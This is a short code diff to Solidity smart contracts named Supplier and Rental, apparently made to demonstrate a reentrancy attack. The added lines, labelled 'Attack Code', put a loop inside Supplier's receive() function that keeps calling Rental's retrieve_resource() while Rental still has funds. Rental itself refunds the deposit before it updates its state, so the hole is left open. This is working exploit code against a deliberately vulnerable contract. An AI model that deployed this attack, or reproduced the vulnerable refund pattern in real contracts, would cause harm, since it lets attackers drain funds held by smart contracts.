@@ -90,6 +90,8 @@ contract Supplier {
     }
     
     receive() external payable {
+        if(address(r).balance > 1){
+        r.retrieve_resource();}         // Attack Code
     }
     
     function get_balance() public view returns (uint){
@@ -119,8 +121,8 @@ contract Rental {
     function retrieve_resource() external {
         require(resource_available == false && msg.sender == resource_owner);
         (bool b,) = resource_owner.call.value(deposit)(""); //RETURN DEPOSIT HERE
-        require(b);
-        resource_available = true; 
+        require(b,"Failed Attack");
+        resource_available = true;
         
 
         
